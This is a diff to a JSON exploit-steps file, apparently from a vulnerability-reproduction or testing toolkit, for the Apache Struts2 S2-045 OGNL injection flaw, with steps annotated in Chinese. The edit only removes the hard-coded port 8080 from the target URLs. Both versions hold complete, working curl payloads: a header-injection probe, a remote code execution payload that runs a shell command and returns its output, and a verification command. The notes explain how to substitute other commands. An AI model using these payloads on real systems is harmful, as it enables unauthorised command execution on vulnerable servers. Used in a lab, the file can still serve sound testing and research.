@@ -32,19 +32,19 @@
     {
       "step": 1,
       "description": "验证漏洞存在性，通过注入OGNL表达式执行简单计算或添加响应头",
-      "command": "curl -H \"Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','S2-045-OK')}.multipart/form-data\" http://{TARGET}:8080/showcase.action -I",
+      "command": "curl -H \"Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','S2-045-OK')}.multipart/form-data\" http://{TARGET}/showcase.action -I",
       "expected_result": "响应头中包含 X-Test: S2-045-OK",
       "notes": "确保目标运行在默认端口8080，如果端口不同需调整命令"
     },
     {
       "step": 2,
       "description": "执行远程代码执行（RCE），例如运行id命令获取系统信息",
-      "command": "curl -H \"Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data\" \"http://{TARGET}:8080/showcase.action\"",
+      "command": "curl -H \"Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data\" \"http://{TARGET}/showcase.action\"",
       "expected_result": "响应体中包含命令执行结果，如uid和gid信息",
       "notes": "此命令执行id命令，可根据需要替换#cmd变量为其他命令；注意目标操作系统可能影响命令格式"
     }
   ],
-  "verification_command": "curl -H \"Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data\" http://{TARGET}:8080/ -I",
+  "verification_command": "curl -H \"Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data\" http://{TARGET}/ -I",
   "verification_success_sign": "响应头中出现 vulhub: 54289（即233*233的结果）",
   "requires_callback": false,
   "callback_note": "此漏洞不需要目标回连攻击机，直接通过OGNL表达式在服务器端执行命令并返回结果；替代方案包括使用其他OGNL payload变体执行不同命令",
